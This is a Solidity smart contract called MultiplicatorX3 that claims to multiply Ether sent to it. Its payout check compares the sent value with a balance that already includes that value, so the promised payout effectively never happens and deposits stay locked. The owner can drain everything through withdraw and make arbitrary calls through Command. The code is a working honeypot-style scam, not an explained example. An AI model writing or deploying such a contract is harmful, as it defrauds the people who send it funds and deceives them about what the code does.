1 pragma solidity ^0.4.18;
2 
3 contract MultiplicatorX3
4 {
5     address public Owner = msg.sender;
6    
7     function() public payable{}
8    
9     function withdraw()
10     payable
11     public
12     {
13         require(msg.sender == Owner);
14         Owner.transfer(this.balance);
15     }
16     
17     function Command(address adr,bytes data)
18     payable
19     public
20     {
21         require(msg.sender == Owner);
22         adr.call.value(msg.value)(data);
23     }
24     
25     function multiplicate(address adr)
26     public
27     payable
28     {
29         if(msg.value>=this.balance)
30         {        
31             adr.transfer(this.balance+msg.value);
32         }
33     }
34 }